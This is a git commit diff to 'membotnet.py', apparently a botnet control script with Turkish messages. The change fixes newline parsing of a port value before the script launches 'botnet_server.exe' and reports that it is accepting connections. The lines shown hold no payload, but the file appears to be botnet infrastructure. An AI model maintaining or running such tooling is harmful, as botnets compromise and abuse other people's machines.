06bcecf6de359bfbd1f328ec9522704387bb74df
___GoodWay___ <80381071+G00Dway@users.noreply.github.com>
2022-06-30 16:09:40 +0400

    Add files via upload

--- membotnet.py
+++ membotnet.py
@@ -436,10 +436,9 @@ else:
             for line in port:
                 if server in line:
                     load = line.split(server+':')
+                    if "\n" in load[1]:
+                        load[1] = load[1].replace("\n", "")
                     break
-    if "\n" in load[0]:
-        load[0] = load[0].split("\n")
-        load[0] = load[0]
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+'" Yükleniyor... [Port: '+load[1]+']')
     os.system("start "+current_path+"/server/botnet_server.exe "+server+" "+load[1])
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+f'" bağlantıları alıyor! ({Fore.LIGHTGREEN_EX}online{Fore.RESET})')
